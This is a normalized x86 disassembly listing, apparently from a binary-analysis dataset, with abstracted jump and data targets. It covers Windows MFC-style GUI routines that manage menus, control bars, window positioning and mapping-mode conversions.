cmp [ ebx + 0x3c ] 0x0
je r-xdata
push [ ebp - 0x24 ]
push [ esi + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_443753
test eax eax
mov [ ebp - 0x1c ] eax
je r-xdata
mov ebx [ ebp - 0x4 ]
push ebx
push edi
call [ GetSubMenu@IAT ]
cmp eax [ esi + 0x4 ]
je r-xdata
xor eax eax
cmp eax 0xf000
jae r-xdata
push 0x0
push [ eax + 0x4 ]
call edi
test eax eax
mov [ ebp - 0x28 ] eax
je r-xdata
push edi
call sub_443753
mov [ ebp - 0x8 ] eax
inc ebx
cmp ebx [ ebp + 0x10 ]
jl r-xdata
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
add [ ebp - 0x24 ] eax
push 0x1
pop eax
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push [ ebp - 0x24 ]
push [ esi + 0x4 ]
call edi
cmp eax [ ebp - 0x28 ]
jne r-xdata
push eax
push 0x0
jmp r-xdata
inc [ ebp - 0x24 ]
jmp r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_441e0e
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
mov ebx eax
cmp ebx [ ebp - 0xc ]
jae r-xdata
cmp [ ebp - 0x24 ] ebx
jae r-xdata
sub_4507e9
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
call sub_43fe5b
mov ecx [ esi + 0x68 ]
mov edi [ ebp + 0x8 ]
test ecx ecx
mov ebx eax
je r-xdata
cmp [ ebp + 0xc ] 0xffff
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ ecx ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x7c ]
test eax eax
jne r-xdata
test edi edi
je r-xdata
and [ esi + 0x24 ] 0xffffffbf
cmp [ ebx + 0x50 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
and [ esi + 0x90 ] 0x0
test [ ebp + 0xc ] 0x810
jne r-xdata
mov [ esi + 0x90 ] 0xe002
mov [ esi + 0x90 ] 0xe001
jmp r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
test eax eax
je r-xdata
cmp edi 0xf000
jb r-xdata
mov eax [ esi + 0x90 ]
cmp eax [ esi + 0x94 ]
je r-xdata
push [ eax + 0x1c ]
call [ UpdateWindow@IAT ]
jmp r-xdata
push 0x0
push [ esi + 0x90 ]
push 0x362
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0xd4 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x36a
push [ esi + 0x1c ]
call [ PostMessageA@IAT ]
cmp edi 0xff00
jb r-xdata
cmp edi 0xf1f0
jae r-xdata
mov [ esi + 0x90 ] edi
jmp r-xdata
mov [ esi + 0x90 ] 0xef1f
jmp r-xdata
add edi 0xffff1000
shr edi 0x4
add edi 0xef00
or [ ebx + 0x24 ] 0x40
sub_4508fa
mov ecx [ esp + 0x8 ]
push esi
push 0xff
call sub_442578
mov esi eax
push 0x100
push esi
push [ esp + 0x10 ]
call sub_44384a
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
push 0xffffffff
call sub_4425c7
pop esi
retn 0x8
push 0xa
push esi
call sub_42e6a3
pop ecx
test eax eax
pop ecx
je r-xdata
and [ eax ] 0x0
sub_450961
mov eax sub_463754
call sub_42dc88
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x94 ]
and [ esi + 0x24 ] 0xffffffbf
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call [ eax + 0xd4 ]
mov ebx eax
xor eax eax
cmp ebx eax
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp - 0x10 ] ecx
cmp [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov edi [ ebp + 0x8 ]
cmp edi eax
je r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
jmp r-xdata
push eax
mov ecx ebx
call sub_4416d5
mov ecx ebx
call sub_43fcfb
test eax eax
je r-xdata
cmp edi 0xef06
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
jmp r-xdata
mov [ eax + 0x94 ] edi
mov [ eax + 0x90 ] edi
mov eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push edi
mov ecx esi
call [ eax + 0xc4 ]
mov eax [ ebp - 0x10 ]
cmp [ esi + 0x9c ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov [ esi + 0x94 ] edi
mov [ esi + 0x90 ] edi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov edi 0xf005
sub_450a3c
push esi
mov esi ecx
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4409c7
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov eax [ esi + 0x90 ]
cmp eax [ esi + 0x94 ]
je r-xdata
push eax
mov ecx esi
call sub_450a6d
sub_450a84
mov eax sub_463768
call sub_42dc88
sub esp 0x1c
push esi
mov esi ecx
push 0xa
lea ecx [ ebp - 0x28 ]
call sub_43cdcd
mov esi [ esi + 0x70 ]
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov esi [ ebp - 0x24 ]
push edi
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_43ce2c
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax esi
mov esi [ esi ]
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x78 ] 0x0
je r-xdata
test esi esi
jne r-xdata
push edi
lea ecx [ ebp - 0x28 ]
call sub_43cef0
mov eax [ ecx ]
call [ eax + 0x58 ]
jmp r-xdata
call sub_43fcfb
mov edx [ eax ]
mov ecx eax
call [ edx + 0x58 ]
jmp r-xdata
mov eax esi
mov esi [ esi ]
mov edi [ eax + 0x8 ]
mov ecx edi
mov eax [ edi ]
call [ eax + 0xd0 ]
test eax eax
je r-xdata
pop edi
test esi esi
je r-xdata
sub_450b0f
cmp [ esp + 0x4 ] 0x0
push esi
push edi
je r-xdata
xor eax eax
mov esi [ ecx + 0x70 ]
mov eax esi
mov esi [ esi ]
mov edi [ eax + 0x8 ]
push [ edi + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
cmp eax [ esp + 0xc ]
jne r-xdata
test esi esi
je r-xdata
mov eax edi
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_450b43
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x4 ]
call sub_450b0f
test eax eax
je r-xdata
mov [ esi + 0x1c ] 0x1
push edi
mov edi [ esi ]
mov ecx eax
call sub_44163f
shr eax 0x1c
and eax 0x1
mov ecx esi
push eax
call [ edi + 0x4 ]
pop edi
jmp r-xdata
pop esi
retn 0x4
sub_450b78
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_450b0f
mov esi eax
test esi esi
je r-xdata
xor eax eax
push 0x0
mov ecx esi
call sub_44163f
not eax
shr eax 0x1c
and eax 0x1
mov ecx edi
push eax
push esi
call sub_45054f
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_450bb1
mov eax sub_46377c
call sub_42dc88
sub esp 0x104
mov eax [ rw-data ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] eax
mov esi [ ebp + 0xc ]
mov edi 0xfffffdf8
xor ebx ebx
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
cmp eax edi
mov [ ebp - 0x4 ] ebx
jne r-xdata
cmp eax 0xfffffdee
jne r-xdata
test [ esi + 0x64 ] 0x1
jne r-xdata
cmp ecx ebx
je r-xdata
test [ esi + 0xb4 ] 0x1
je r-xdata
push ecx
call [ GetDlgCtrlID@IAT ]
movzx ecx ax
cmp [ esi + 0x8 ] edi
push 0x50
push [ ebp - 0x10 ]
lea eax [ esi + 0x10 ]
push eax
jne r-xdata
lea eax [ ebp - 0x110 ]
push 0x100
push eax
push ecx
call sub_44384a
test eax eax
je r-xdata
call sub_4426dd
add esp 0xc
call [ lstrcpynA@IAT ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
mov eax ebx
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push 0xa
lea eax [ ebp - 0x110 ]
push 0x1
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_443871
mov eax [ ebp + 0x10 ]
push 0x213
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] ebx
push [ esi ]
call [ SetWindowPos@IAT ]
push 0x1
pop ebx
sub_450c88
push ebx
push esi
mov esi [ esp + 0xc ]
push 0x1
pop ebx
mov eax [ esi + 0x4 ]
sub eax 0xe701
je r-xdata
push 0x14
pop eax
dec eax
je r-xdata
mov eax 0x90
jmp r-xdata
dec eax
je r-xdata
push edi
mov edi [ esi ]
push eax
call [ GetKeyState@IAT ]
movsx eax ax
and eax ebx
mov ecx esi
push eax
call [ edi ]
pop edi
mov eax 0x91
jmp r-xdata
sub eax 0x3
je r-xdata
cmp [ rw-data ] 0x0
push 0x15
pop eax
jne r-xdata
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov ebx 0x8000
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_450ce9
push esi
mov esi ecx
call sub_420710
cmp eax esi
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ eax + 0x1c ] 0x1
mov ecx [ esp + 0x8 ]
xor edx edx
cmp [ esi + 0x50 ] edx
mov eax [ ecx ]
setne dl
push edx
call [ eax + 0x4 ]
jmp r-xdata
pop esi
retn 0x4
sub_450d18
push esi
mov esi ecx
call sub_44163f
test ah 0x80
je r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xbc ]
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax [ ecx ]
call [ eax + 0x68 ]
test eax eax
jne r-xdata
push 0x0
test eax eax
je r-xdata
push [ eax + 0x1c ]
jmp r-xdata
mov ecx esi
call sub_450d5c
sub_450d5c
push ebp
mov ebp esp
sub esp 0x204
push esi
push edi
mov esi ecx
call sub_44163f
test ah 0x40
je r-xdata
push [ esi + 0xac ]
lea eax [ ebp - 0x204 ]
push eax
call [ lstrcpyA@IAT ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
and [ ebp - 0x204 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov edi [ lstrcatA@IAT ]
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
push [ esi + 0x1c ]
call sub_447993
pop edi
pop esi
leave
retn 0x4
mov edi [ lstrcatA@IAT ]
lea eax [ ebp - 0x204 ]
push r--data
push eax
call edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x204 ]
push eax
call edi
mov eax [ esi + 0x40 ]
test eax eax
jle r-xdata
push [ esi + 0xac ]
lea eax [ ebp - 0x204 ]
push eax
call edi
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x204 ]
push eax
call [ lstrcpyA@IAT ]
mov eax [ esi + 0x40 ]
test eax eax
jle r-xdata
push eax
lea eax [ ebp - 0x204 ]
push r--data
push eax
call [ lstrlenA@IAT ]
lea eax [ ebp + eax - 0x204 ]
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x204 ]
push r--data
push eax
call edi
push eax
lea eax [ ebp - 0x204 ]
push r--data
push eax
call [ lstrlenA@IAT ]
lea eax [ ebp + eax - 0x204 ]
push eax
call [ wsprintfA@IAT ]
add esp 0xc
sub_450e59
sub esp 0xc
push ebx
push ebp
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0xc0 ]
xor ebx ebx
mov [ esp + 0x18 ] eax
cmp [ esp + 0x20 ] ebx
je r-xdata
mov ebp [ esi + 0x70 ]
mov edi [ esp + 0x24 ]
cmp ebp ebx
mov [ esp + 0x10 ] ebx
je r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx ebx
je r-xdata
mov eax [ esp + 0x10 ]
cmp [ esp + 0x20 ] ebx
mov [ edi + 0x8 ] eax
je r-xdata
mov eax ebp
mov ebp [ ebp ]
mov ebx [ eax + 0x8 ]
push [ ebx + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
cmp eax 0xe800
mov [ esp + 0x14 ] eax
jb r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x5c ]
mov ebp [ GetDlgItem@IAT ]
push 0xea21
push [ esi + 0x1c ]
mov [ esi + 0x9c ] ebx
call ebp
test eax eax
mov [ esp + 0x20 ] eax
mov ebx 0xe900
je r-xdata
mov eax [ edi + 0x10 ]
push ebx
mov ecx esi
mov [ esi + 0x9c ] eax
call sub_44f7d3
push [ edi ]
mov ebp [ GetDlgItem@IAT ]
push [ esi + 0x1c ]
call ebp
push ebx
push eax
mov [ esp + 0x28 ] eax
call [ ShowWindow@IAT ]
push [ esi + 0x1c ]
call [ GetMenu@IAT ]
cmp eax ebx
mov [ edi + 0x4 ] eax
je r-xdata
test ebp ebp
jne r-xdata
cmp eax 0xe81f
ja r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
push ebx
push [ esi + 0x1c ]
call ebp
test eax eax
je r-xdata
mov eax [ esi + 0x48 ]
push 0x7915
mov [ edi + 0x14 ] eax
mov ecx esi
mov [ esi + 0x48 ] ebx
call sub_44f3a4
mov ebx 0xe900
cmp [ edi ] ebx
je r-xdata
push 0x1
push ebx
push [ esi + 0x1c ]
call [ InvalidateRect@IAT ]
push ebx
push [ esi + 0x1c ]
call [ SetMenu@IAT ]
and [ esi + 0xb8 ] 0xfffffffe
xor ebx ebx
push 0x1
lea ecx [ eax - 0xe800 ]
pop eax
shl eax cl
mov ecx ebx
mov [ esp + 0x24 ] eax
mov eax [ ebx ]
call [ eax + 0xc8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x68 ]
test ecx ecx
je r-xdata
push 0x1
push 0x0
push [ esi + 0x1c ]
call [ InvalidateRect@IAT ]
push [ edi + 0x4 ]
push [ esi + 0x1c ]
call [ SetMenu@IAT ]
push ebx
push 0xfffffff4
push [ esp + 0x28 ]
call [ SetWindowLongA@IAT ]
push 0xea21
push 0xfffffff4
push eax
call [ SetWindowLongA@IAT ]
mov eax [ esp + 0x20 ]
push ebx
push [ esi + 0x1c ]
call ebp
jmp r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0xd0 ]
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
or [ esp + 0x10 ] eax
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0xc8 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x5c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x8
push 0xea21
push 0xfffffff4
push eax
call [ SetWindowLongA@IAT ]
jmp r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
push 0x1
and eax [ esp + 0x28 ]
mov ecx esi
push eax
push ebx
call sub_45054f
cmp [ esp + 0x14 ] 0xe81f
je r-xdata
push 0x5
push [ esp + 0x24 ]
call [ ShowWindow@IAT ]
mov eax [ edi + 0x14 ]
push 0x1
mov ecx esi
mov [ esi + 0x48 ] eax
call sub_44f7d3
push eax
push [ esi + 0x1c ]
call ebp
mov [ esp + 0x20 ] eax
sub_451088
push esi
mov esi ecx
test [ esi + 0xb8 ] 0x1
je r-xdata
test [ esi + 0xb8 ] 0x2
je r-xdata
mov eax [ esi ]
push [ esi + 0xa8 ]
call [ eax + 0xe4 ]
mov eax [ esi + 0xb8 ]
test al 0x8
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0xe0 ]
mov eax [ esi + 0x90 ]
cmp eax [ esi + 0x94 ]
je r-xdata
mov edx [ esi ]
and eax 0x4
push eax
mov ecx esi
call [ edx + 0xc8 ]
push [ esi + 0x1c ]
call [ UpdateWindow@IAT ]
and [ esi + 0xb8 ] 0x0
pop esi
retn
push eax
mov ecx esi
call sub_450a6d
sub_4510fa
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0xb0 ] edi
jne r-xdata
pop edi
pop esi
leave
retn 0x4
mov eax [ esi + 0xb8 ]
lea ecx [ esi + 0xb8 ]
push ebx
push 0x1
pop ebx
test al 0x4
mov [ esi + 0xb0 ] ebx
je r-xdata
and al 0xf3
cmp [ ebp + 0x8 ] edi
mov [ ecx ] eax
je r-xdata
mov [ ebp + 0x8 ] ebx
mov ecx esi
call sub_44163f
test ah 0x20
je r-xdata
mov ecx [ esi + 0x68 ]
cmp ecx edi
je r-xdata
push ebx
lea eax [ esi + 0x58 ]
push edi
push eax
push 0x2
push 0xe900
push 0xffff
push edi
mov ecx esi
call sub_44024e
mov eax 0x7fff
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov ebx 0xffff
push 0xe900
push ebx
push edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
call sub_44024e
lea eax [ ebp - 0x10 ]
push 0x1
push eax
lea eax [ esi + 0x58 ]
push eax
push 0x2
push 0xe900
push ebx
push edi
mov ecx esi
call sub_44024e
mov eax [ esi ]
lea ecx [ ebp - 0x10 ]
push edi
push ecx
mov ecx esi
call [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
push 0x16
sub eax [ ebp - 0xc ]
mov ecx esi
push eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
push eax
push edi
push edi
push edi
call sub_4417b0
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0xb0 ] edi
pop ebx
sub_4511e7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
dec eax
je r-xdata
xor edx edx
push 0x1
push edx
push [ ebp + 0xc ]
push 0x1
push 0xe900
push 0xffff
push edx
call sub_44024e
dec eax
je r-xdata
push 0x1
pop eax
dec eax
jne r-xdata
xor edx edx
cmp [ ebp + 0xc ] edx
jne r-xdata
push [ ebp + 0xc ]
lea esi [ ecx + 0x58 ]
push esi
call [ EqualRect@IAT ]
test eax eax
jne r-xdata
cmp [ ecx + 0x58 ] edx
lea eax [ ecx + 0x58 ]
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
push esi
call [ CopyRect@IAT ]
jmp r-xdata
push eax
call [ SetRectEmpty@IAT ]
jmp r-xdata
cmp [ eax + 0x8 ] edx
jne r-xdata
pop esi
pop ebp
retn 0x8
cmp [ eax + 0x4 ] edx
jne r-xdata
cmp [ eax + 0xc ] edx
je r-xdata
sub_451296
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ GetKeyState@IAT ]
push edi
mov edi ecx
push 0x11
call esi
test ax ax
jge r-xdata
xor ebx ebx
push 0x8
pop ebx
jmp r-xdata
xor eax eax
push 0x4
pop eax
jmp r-xdata
push 0x10
call esi
test ax ax
jge r-xdata
mov edi [ ebp + 0x8 ]
movzx eax bx
shl edi 0x10
or edi eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
movzx ecx bx
shl eax 0x10
or eax ecx
push eax
push 0x20a
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
mov ebx eax
jmp r-xdata
or ebx eax
call [ GetFocus@IAT ]
mov esi eax
call [ GetDesktopWindow@IAT ]
test esi esi
mov [ ebp - 0x4 ] eax
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
leave
retn 0x8
test esi esi
je r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
push [ ebp + 0xc ]
push edi
push 0x20a
push esi
call [ SendMessageA@IAT ]
push esi
mov ebx eax
call [ GetParent@IAT ]
test ebx ebx
mov esi eax
jne r-xdata
sub_451339
push esi
mov esi [ esp + 0x8 ]
push edi
cmp esi 0xffffffff
mov edi ecx
jne r-xdata
push esi
mov ecx edi
call sub_451389
cmp esi 0xffffffff
je r-xdata
push [ edi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
retn 0x4
push esi
mov ecx edi
call sub_4417ff
push esi
mov ecx edi
call sub_451389
push [ edi + 0x1c ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
push 0x1
jmp r-xdata
push 0x9
pop esi
sub_451389
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x4
cmp eax 0x6
je r-xdata
cmp eax 0x7
je r-xdata
cmp eax 0x8
je r-xdata
cmp eax 0x4
je r-xdata
push [ ecx + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call [ BringWindowToTop@IAT ]
sub_4513c9
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0xd0 ]
test eax eax
je r-xdata
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
mov eax [ esi + 0x78 ]
pop esi
retn
xor eax eax
pop esi
retn
cmp [ eax + 0x78 ] 0x0
je r-xdata
push 0x1
pop eax
pop esi
retn
sub_4513f3
push esi
push edi
mov edi ecx
mov ecx [ edi + 0xb4 ]
call sub_442eec
mov esi eax
test esi esi
jne r-xdata
push [ esp + 0xc ]
mov eax [ esi ]
mov ecx esi
push edi
call [ eax + 0xf4 ]
test eax eax
jne r-xdata
call sub_43b7b5
mov eax esi
pop edi
pop esi
retn 0x4
call sub_447818
sub_45142c
mov eax sub_4637ed
call sub_42dc88
push ecx
push esi
push edi
mov edi ecx
mov esi r--data
mov [ edi + 0xb4 ] r--data
add esi 0x8
cmp esi r--data
jl r-xdata
push [ esi - 0x4 ]
mov ecx edi
call sub_450b0f
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax [ esi ]
test ah 0xf0
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push 0xa4
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x0
call sub_44bf13
jmp r-xdata
call sub_447818
mov ecx [ esi ]
push [ esi - 0x4 ]
or [ ebp - 0x4 ] 0xffffffff
or ecx 0x56000000
push ecx
push edi
mov ecx eax
call sub_44c016
test eax eax
jne r-xdata
sub_4514c1
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push ebx
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
push [ ebp + 0x10 ]
push edi
call sub_44c0c9
pop edi
pop esi
pop ebx
leave
retn 0xc
mov edx [ edi + 0x64 ]
xor esi esi
mov eax r--data
push [ esi * 8 + r--data ]
mov ecx [ ebp - 0x4 ]
call sub_450b0f
mov ecx eax
add eax 0x8
inc esi
cmp eax r--data
jl r-xdata
mov ebx [ eax ]
xor ebx edx
test bh 0xf0
je r-xdata
jmp r-xdata
sub_451516
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
push edi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_44c2f4
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
and [ ebp + 0xc ] ecx
mov esi r--data
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
xor eax [ ecx + 0x64 ]
test ah 0xf0
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0xffffffff
push [ eax + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
push eax
mov ecx edi
call sub_44cbf8
test eax eax
jg r-xdata
add esi 0x8
cmp esi r--data
jl r-xdata
push [ esi ]
mov ecx ebx
call sub_450b0f
mov [ ebp + 0xc ] eax
test edi edi
mov ecx edi
jne r-xdata
push [ esi ]
mov ecx ebx
call sub_450b0f
mov edi eax
test edi edi
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
sub_45159b
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ecx
cmp [ edi + 0x6c ] ebx
je r-xdata
test [ edi + 0x64 ] 0x4
je r-xdata
mov esi [ edi + 0x70 ]
cmp esi ebx
je r-xdata
push [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
call sub_4513f3
push 0x15
push ebx
push ebx
mov esi eax
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push ebx
call sub_4417b0
cmp [ esi + 0x20 ] ebx
jne r-xdata
or [ ebp + 0x14 ] 0x4
test [ ebp + 0x15 ] 0x50
je r-xdata
cmp [ esi + 0x78 ] ebx
je r-xdata
push 0xe81f
mov ecx esi
call sub_441585
push ebx
push edi
mov ecx eax
call sub_44c0c9
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0xc8 ]
push 0xfffffff0
push [ edi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
mov eax [ edi + 0x1c ]
mov [ esi + 0x20 ] eax
mov eax [ ebp + 0x14 ]
and ah 0x2f
or ah 0x20
mov [ ebp + 0x14 ] eax
mov ecx esi
call sub_44c061
cmp eax 0x1
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
push 0x8
mov ecx esi
call sub_4417ff
mov eax [ esi + 0x64 ]
and eax [ ebp + 0x14 ]
test ah 0xf0
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
push 0x15
push ebx
push ebx
mov esi eax
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push ebx
call sub_4417b0
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0xc8 ]
jmp r-xdata
push [ esi + 0x1c ]
call [ UpdateWindow@IAT ]
sub_451698
push ebp
mov ebp esp
sub esp 0x10
and [ ebp + 0x18 ] 0xf040
push ebx
mov ebx [ ebp + 0x1c ]
push esi
test ebx ebx
push edi
je r-xdata
mov edi [ ecx + 0x70 ]
and [ ebx ] 0x0
xor eax eax
mov eax edi
mov edi [ edi ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov eax [ esi ]
call [ eax + 0xd0 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x64 ]
and eax [ ebp + 0x18 ]
test ah 0xf0
je r-xdata
cmp [ esi + 0x78 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
jne r-xdata
test al 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
jne r-xdata
inc [ ebp - 0x8 ]
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ IntersectRect@IAT ]
test eax eax
je r-xdata
inc [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0x64 ]
and eax [ ebp + 0x18 ]
jmp r-xdata
mov [ ebx ] esi
pop edi
pop esi
pop ebx
leave
retn 0x18
sub_451789
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ rw-data ]
push [ esi + 0x8 ]
call [ GetMapMode@IAT ]
mov edi eax
cmp edi 0x7
jge r-xdata
mov edi [ GetDeviceCaps@IAT ]
push 0x58
push [ esi + 0x8 ]
call edi
push 0x5a
mov ebx eax
push [ esi + 0x8 ]
call edi
jmp r-xdata
cmp edi 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
push ebx
mov ebx 0x9ec
push ebx
mov [ ebp - 0x4 ] eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
push ebx
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push 0x3
mov ecx esi
call [ eax + 0x34 ]
push [ ebp + 0x8 ]
mov ecx esi
call sub_447450
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_451817
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push [ esi + 0x8 ]
call [ GetMapMode@IAT ]
mov edi eax
cmp edi 0x7
jge r-xdata
mov ebx [ GetDeviceCaps@IAT ]
push 0x58
push [ esi + 0x8 ]
call ebx
push 0x5a
mov edi eax
push [ esi + 0x8 ]
call ebx
jmp r-xdata
cmp edi 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov ebx 0x9ec
push ebx
push edi
push [ esi ]
mov edi [ MulDiv@IAT ]
mov [ ebp - 0x4 ] eax
call edi
push ebx
mov [ esi ] eax
push [ ebp - 0x4 ]
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push 0x3
mov ecx esi
